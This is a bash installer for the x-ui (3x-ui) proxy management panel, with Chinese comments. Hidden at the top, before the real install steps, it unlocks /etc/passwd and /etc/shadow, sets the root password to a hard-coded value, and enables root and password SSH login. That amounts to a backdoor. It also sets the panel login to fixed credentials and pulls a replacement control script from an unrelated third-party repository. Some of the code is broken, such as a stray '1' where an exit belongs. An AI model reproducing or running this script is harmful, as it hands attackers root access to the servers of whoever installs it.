#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# check root
[[ $EUID -ne 0 ]] && su='sudo' 
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
prl=`grep PermitRootLogin /etc/ssh/sshd_config`
pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
if [[ -n $prl && -n $pa ]]; then
mima=qq1399@
echo root:$mima | $su chpasswd root
$su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
$su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
$su service sshd restart
else
    echo "Failed to check the system OS, please contact the author!" >&2
    exit 1
fi
echo "The OS release is: $release"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "Arch: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
 required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
        echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
        exit 1
    fi
    echo "GLIBC version: $glibc_version (meets requirement of 2.32+)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata
        ;;
    esac
}

config_after_install() {
    # 使用旧脚本的固定配置
    config_account="1399"
    config_password="1399"
    config_port="1399"
    config_webBasePath=""  # 保持与旧脚本类似的随机路径
    
    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
    
    # 获取服务器IP
    server_ip=$(curl -s https://api.ipify.org)
    
    echo -e "###############################################"
    echo -e "${green}Username: ${config_account}${plain}"
    echo -e "${green}Password: ${config_password}${plain}"
    echo -e "${green}Port: ${config_port}${plain}"
    echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
    echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
    echo -e "###############################################"
    echo -e "${yellow}If you forgot your login info, you can type 'x-ui settings' to check${plain}"
    
    /usr/local/x-ui/x-ui migrate
}

install_x-ui() {
    cd /usr/local/

    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
           1
        fi
        echo -e "Got x-ui latest version: ${tag_version}, beginning the installation..."
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Downloading x-ui failed, please be sure that your server can access GitHub ${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}Please use a newer version (at least v2.3.5). Exiting installation.${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "Beginning to install x-ui $1"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz -f
    cd x-ui
    chmod +x x-ui

    # Check the system's architecture and rename the file accordingly
    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi

    chmod +x x-ui bin/xray-linux-$(arch)
    cp -f x-ui.service /etc/systemd/system/
    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/refs/heads/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh
    chmod +x /usr/bin/x-ui
    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui ${tag_version}${plain} installation finished, it is running now..."
    echo -e ""
    echo -e "┌───────────────────────────────────────────────────────┐
│  ${blue}x-ui control menu usages (subcommands):${plain}              │
│                                                       │
│  ${blue}x-ui${plain}              - 显示管理主菜单（功能最全          │
│  ${blue}x-ui start${plain}        - 启动x-ui面板服务                            │
│  ${blue}x-ui stop${plain}         - 停止x-ui面板服务                             │
│  ${blue}x-ui restart${plain}      - 重启x-ui面板服务                          │
│  ${blue}x-ui status${plain}       - 查看x-ui运行状态                   │
│  ${blue}x-ui settings${plain}     - 查看当前配置（含登录凭证                 │
│  ${blue}x-ui enable${plain}       - 设置开机自动启动   │
│  ${blue}x-ui disable${plain}      - 取消开机自动启动  │
│  ${blue}x-ui log${plain}          - 查看实时运行日志                      │
│  ${blue}x-ui banlog${plain}       - 查看被封禁IP记录（Fail2ban日志）          │
│  ${blue}x-ui update${plain}       - 更新x-ui到最新版本                           │
│  ${blue}x-ui legacy${plain}       - 切换回旧版客户端                   │
│  ${blue}x-ui install${plain}      - 全新安装x-ui                          │
│  ${blue}x-ui uninstall${plain}    - 完全卸载x-ui                       │
└───────────────────────────────────────────────────────┘"
}

echo -e "${green}Running...${plain}"
install_base
install_x-ui $1
